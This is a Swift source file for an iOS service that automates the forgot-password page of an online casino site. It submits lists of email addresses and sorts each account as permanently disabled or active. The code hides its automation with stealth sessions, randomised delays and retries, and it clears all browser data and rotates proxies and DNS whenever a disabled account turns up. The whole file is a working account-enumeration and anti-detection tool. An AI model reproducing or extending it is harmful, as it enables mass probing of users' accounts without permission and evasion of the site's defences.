import Foundation
import Observation
import WebKit
import UIKit

@Observable
@MainActor
class DisabledCheckService {
    static let shared = DisabledCheckService()

    var isRunning: Bool = false
    var progress: Double = 0
    var currentEmail: String = ""
    var results: [DisabledCheckResult] = []
    var logs: [PPSRLogEntry] = []

    private var checkTask: Task<Void, Never>?
    private let forgotPasswordURL = URL(string: "https://www.joefortuneonlinepokies.net/forgot-password")!
    private let blockedDomains: Set<String> = ["ignitionpoker.com", "ignitionpoker.eu", "joefortune.com", "joefortune.fun"]

    private let stealthService = PPSRStealthService.shared
    private let proxyService = ProxyRotationService.shared

    struct DisabledCheckResult: Identifiable {
        let id: String = UUID().uuidString
        let email: String
        let isDisabled: Bool
        let responseText: String
        let timestamp: Date = Date()

        var statusLabel: String {
            isDisabled ? "Perm Disabled" : "Active / No Acc"
        }
    }

    func runCheck(emails: [String], onComplete: @escaping ([DisabledCheckResult]) -> Void) {
        guard !isRunning, !emails.isEmpty else { return }

        isRunning = true
        progress = 0
        results.removeAll()
        addLog("Starting disabled check for \(emails.count) emails")

        checkTask = Task {
            let uniqueEmails = Array(Set(emails.map { $0.lowercased().trimmingCharacters(in: .whitespacesAndNewlines) })).filter { !$0.isEmpty }
            var disabledFound = 0

            for (index, email) in uniqueEmails.enumerated() {
                if Task.isCancelled { break }

                currentEmail = email
                progress = Double(index) / Double(uniqueEmails.count)

                let result = await checkSingleEmail(email)
                results.append(result)

                if result.isDisabled {
                    disabledFound += 1
                    addLog("PERM DISABLED: \(email)", level: .error)
                    await burnHistoryAndRotate()
                } else {
                    addLog("ACTIVE/NO ACC: \(email)", level: .success)
                }

                let delay = result.isDisabled ? 1.5 : 0.8
                try? await Task.sleep(for: .seconds(delay))
            }

            progress = 1.0
            currentEmail = ""
            isRunning = false
            addLog("Check complete: \(disabledFound) disabled out of \(uniqueEmails.count)", level: .success)
            onComplete(results)
        }
    }

    func stopCheck() {
        checkTask?.cancel()
        checkTask = nil
        isRunning = false
        currentEmail = ""
        addLog("Check stopped by user", level: .warning)
    }

    private func checkSingleEmail(_ email: String) async -> DisabledCheckResult {
        for attempt in 1...3 {
            let session = LoginSiteWebSession(targetURL: forgotPasswordURL)
            session.stealthEnabled = true
            await session.setUp(wipeAll: true)

            let loaded = await session.loadPage(timeout: TimeoutResolver.resolveAutomationTimeout(20))
            guard loaded else {
                session.tearDown(wipeAll: true)
                if attempt < 3 {
                    addLog("Retrying page load for \(email) (attempt \(attempt))", level: .warning)
                    try? await Task.sleep(for: .seconds(Double.random(in: 0.8...1.5)))
                    continue
                }
                addLog("Failed to load forgot-password page for \(email) after 3 attempts", level: .warning)
                return DisabledCheckResult(email: email, isDisabled: false, responseText: "Page load failed")
            }

            await session.dismissCookieNotices()
            try? await Task.sleep(for: .milliseconds(Int.random(in: 300...700)))

            let fillResult = await session.fillUsername(email)
            guard fillResult.success else {
                session.tearDown(wipeAll: true)
                if attempt < 3 {
                    addLog("Retrying fill for \(email) (attempt \(attempt))", level: .warning)
                    try? await Task.sleep(for: .seconds(Double.random(in: 0.8...1.5)))
                    continue
                }
                addLog("Failed to fill email for \(email): \(fillResult.detail)", level: .warning)
                return DisabledCheckResult(email: email, isDisabled: false, responseText: "Fill failed: \(fillResult.detail)")
            }

            try? await Task.sleep(for: .milliseconds(Int.random(in: 200...500)))

            var submitSucceeded = false
            for submitAttempt in 1...4 {
                let submitResult = await session.clickLoginButtonCalibrated(calibration: nil)
                if submitResult.success {
                    submitSucceeded = true
                    addLog("Submit \(submitResult.detail) for \(email) on try \(submitAttempt)")
                    break
                }
                addLog("Submit attempt \(submitAttempt) failed for \(email): \(submitResult.detail)", level: .warning)
                try? await Task.sleep(for: .milliseconds(Int.random(in: 300...600)))
            }

            guard submitSucceeded else {
                session.tearDown(wipeAll: true)
                if attempt < 3 {
                    addLog("All submit attempts failed for \(email), retrying full flow (attempt \(attempt))", level: .warning)
                    try? await Task.sleep(for: .seconds(Double.random(in: 1.0...2.0)))
                    continue
                }
                addLog("Failed to submit for \(email) after all retries", level: .error)
                return DisabledCheckResult(email: email, isDisabled: false, responseText: "Submit failed after all retries")
            }

            var pageContent = ""
            let pollStart = Date()
            let pollTimeout: TimeInterval = TimeoutResolver.resolveAutomationTimeout(8)
            while Date().timeIntervalSince(pollStart) < pollTimeout {
                try? await Task.sleep(for: .milliseconds(Int.random(in: 400...800)))
                pageContent = await session.getPageContent() ?? ""
                let contentLower = pageContent.lowercased()
                let disabledPhrases = [
                    "has been disabled"
                ]
                for phrase in disabledPhrases {
                    if contentLower.contains(phrase) {
                        session.tearDown(wipeAll: true)
                        return DisabledCheckResult(email: email, isDisabled: true, responseText: "Account disabled: \(phrase)")
                    }
                }
                if contentLower.contains("information was correct") || contentLower.contains("email will be sent") {
                    session.tearDown(wipeAll: true)
                    return DisabledCheckResult(email: email, isDisabled: false, responseText: "Account active or no account")
                }
                if contentLower.contains("error") || contentLower.contains("invalid") || contentLower.contains("try again") {
                    break
                }
            }

            session.tearDown(wipeAll: true)

            if attempt < 3 && pageContent.trimmingCharacters(in: .whitespacesAndNewlines).count < 50 {
                addLog("Insufficient response for \(email), retrying (attempt \(attempt))", level: .warning)
                try? await Task.sleep(for: .seconds(Double.random(in: 1.0...2.0)))
                continue
            }

            return DisabledCheckResult(email: email, isDisabled: false, responseText: "Unknown response: \(String(pageContent.prefix(200)))")
        }

        return DisabledCheckResult(email: email, isDisabled: false, responseText: "All attempts failed")
    }

    private func burnHistoryAndRotate() async {
        let dataStore = WKWebsiteDataStore.default()
        let allTypes = WKWebsiteDataStore.allWebsiteDataTypes()
        await dataStore.removeData(ofTypes: allTypes, modifiedSince: .distantPast)
        HTTPCookieStorage.shared.removeCookies(since: .distantPast)
        URLCache.shared.removeAllCachedResponses()

        let _ = proxyService.nextWorkingProxy()
        PPSRDoHService.shared.resetRotation()
        let _ = PPSRDoHService.shared.nextProvider()
        addLog("Rotated proxy + DNS after perm disabled detection")
    }

    var disabledResults: [DisabledCheckResult] {
        results.filter(\.isDisabled)
    }

    var activeResults: [DisabledCheckResult] {
        results.filter { !$0.isDisabled }
    }

    private func addLog(_ message: String, level: PPSRLogEntry.Level = .info) {
        logs.insert(PPSRLogEntry(message: message, level: level), at: 0)
        if logs.count > 200 { logs = Array(logs.prefix(200)) }
    }
}
